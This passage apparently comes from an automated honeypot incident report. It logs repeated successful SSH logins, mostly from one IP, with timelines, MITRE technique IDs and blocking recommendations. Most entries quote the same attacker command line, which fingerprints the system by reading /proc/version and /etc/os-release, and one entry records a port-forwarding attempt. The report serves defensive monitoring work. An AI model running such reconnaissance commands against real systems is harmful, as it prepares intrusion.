- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84835e215a99

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:55 |
| **Last Seen** | 2026-09-04 07:55 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:55:22` | `cowrie.session.connect` |
| `2026-09-04 07:55:24` | `cowrie.client.version` |
| `2026-09-04 07:55:24` | `cowrie.client.kex` |
| `2026-09-04 07:55:31` | `cowrie.login.success` |
| `2026-09-04 07:55:36` | `cowrie.session.params` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.success` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:36` | `cowrie.command.input` |
| `2026-09-04 07:55:38` | `cowrie.log.closed` |
| `2026-09-04 07:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64fd8ec954b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:56 |
| **Last Seen** | 2026-09-04 07:56 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:56:12` | `cowrie.session.connect` |
| `2026-09-04 07:56:14` | `cowrie.client.version` |
| `2026-09-04 07:56:14` | `cowrie.client.kex` |
| `2026-09-04 07:56:23` | `cowrie.login.success` |
| `2026-09-04 07:56:28` | `cowrie.session.params` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.success` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:28` | `cowrie.command.input` |
| `2026-09-04 07:56:32` | `cowrie.log.closed` |
| `2026-09-04 07:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbcee09b77a8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:57 |
| **Last Seen** | 2026-09-04 07:57 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:57:07` | `cowrie.session.connect` |
| `2026-09-04 07:57:09` | `cowrie.client.version` |
| `2026-09-04 07:57:09` | `cowrie.client.kex` |
| `2026-09-04 07:57:21` | `cowrie.login.success` |
| `2026-09-04 07:57:26` | `cowrie.session.params` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.success` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:26` | `cowrie.command.input` |
| `2026-09-04 07:57:29` | `cowrie.log.closed` |
| `2026-09-04 07:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a66c4ddb04

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:57 |
| **Last Seen** | 2026-09-04 07:58 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:57:57` | `cowrie.session.connect` |
| `2026-09-04 07:58:00` | `cowrie.client.version` |
| `2026-09-04 07:58:00` | `cowrie.client.kex` |
| `2026-09-04 07:58:11` | `cowrie.login.success` |
| `2026-09-04 07:58:18` | `cowrie.session.params` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.success` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:18` | `cowrie.command.input` |
| `2026-09-04 07:58:21` | `cowrie.log.closed` |
| `2026-09-04 07:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e455e707559e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 07:58 |
| **Last Seen** | 2026-09-04 07:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:58:33` | `cowrie.session.connect` |
| `2026-09-04 07:58:33` | `cowrie.client.version` |
| `2026-09-04 07:58:33` | `cowrie.client.kex` |
| `2026-09-04 07:58:34` | `cowrie.login.success` |
| `2026-09-04 07:58:34` | `cowrie.direct-tcpip.request` |
| `2026-09-04 07:58:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 07:58:34` | `cowrie.direct-tcpip.data` |
| `2026-09-04 07:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1cb89712c9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:58 |
| **Last Seen** | 2026-09-04 07:59 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:58:51` | `cowrie.session.connect` |
| `2026-09-04 07:58:53` | `cowrie.client.version` |
| `2026-09-04 07:58:53` | `cowrie.client.kex` |
| `2026-09-04 07:59:10` | `cowrie.login.success` |
| `2026-09-04 07:59:16` | `cowrie.session.params` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.success` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:16` | `cowrie.command.input` |
| `2026-09-04 07:59:17` | `cowrie.log.closed` |
| `2026-09-04 07:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3729d032f195

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:59 |
| **Last Seen** | 2026-09-04 08:00 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:59:40` | `cowrie.session.connect` |
| `2026-09-04 07:59:42` | `cowrie.client.version` |
| `2026-09-04 07:59:42` | `cowrie.client.kex` |
| `2026-09-04 07:59:56` | `cowrie.login.success` |
| `2026-09-04 08:00:01` | `cowrie.session.params` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.success` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:01` | `cowrie.command.input` |
| `2026-09-04 08:00:03` | `cowrie.log.closed` |
| `2026-09-04 08:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5ff4b09e9a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:00 |
| **Last Seen** | 2026-09-04 08:00 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:00:28` | `cowrie.session.connect` |
| `2026-09-04 08:00:31` | `cowrie.client.version` |
| `2026-09-04 08:00:31` | `cowrie.client.kex` |
| `2026-09-04 08:00:44` | `cowrie.login.success` |
| `2026-09-04 08:00:51` | `cowrie.session.params` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.success` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:51` | `cowrie.command.input` |
| `2026-09-04 08:00:55` | `cowrie.log.closed` |
| `2026-09-04 08:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f3803e9c88e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:01 |
| **Last Seen** | 2026-09-04 08:01 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:01:26` | `cowrie.session.connect` |
| `2026-09-04 08:01:26` | `cowrie.client.version` |
| `2026-09-04 08:01:26` | `cowrie.client.kex` |
| `2026-09-04 08:01:34` | `cowrie.login.success` |
| `2026-09-04 08:01:40` | `cowrie.session.params` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.success` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:40` | `cowrie.command.input` |
| `2026-09-04 08:01:41` | `cowrie.log.closed` |
| `2026-09-04 08:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b27511c7898

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:02 |
| **Last Seen** | 2026-09-04 08:02 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:02:14` | `cowrie.session.connect` |
| `2026-09-04 08:02:16` | `cowrie.client.version` |
| `2026-09-04 08:02:16` | `cowrie.client.kex` |
| `2026-09-04 08:02:23` | `cowrie.login.success` |
| `2026-09-04 08:02:27` | `cowrie.session.params` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.success` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:27` | `cowrie.command.input` |
| `2026-09-04 08:02:29` | `cowrie.log.closed` |
| `2026-09-04 08:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902d7c4363ec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:02 |
| **Last Seen** | 2026-09-04 08:03 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:02:57` | `cowrie.session.connect` |
| `2026-09-04 08:03:00` | `cowrie.client.version` |
| `2026-09-04 08:03:00` | `cowrie.client.kex` |
| `2026-09-04 08:03:16` | `cowrie.login.success` |
| `2026-09-04 08:03:21` | `cowrie.session.params` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.success` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:21` | `cowrie.command.input` |
| `2026-09-04 08:03:22` | `cowrie.log.closed` |
| `2026-09-04 08:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26cf87341089

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:03 |
| **Last Seen** | 2026-09-04 08:04 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:03:45` | `cowrie.session.connect` |
| `2026-09-04 08:03:47` | `cowrie.client.version` |
| `2026-09-04 08:03:47` | `cowrie.client.kex` |
| `2026-09-04 08:03:58` | `cowrie.login.success` |
| `2026-09-04 08:04:01` | `cowrie.session.params` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.success` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:01` | `cowrie.command.input` |
| `2026-09-04 08:04:02` | `cowrie.log.closed` |
| `2026-09-04 08:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde44fdfd76d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 08:04 |
| **Last Seen** | 2026-09-04 08:04 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
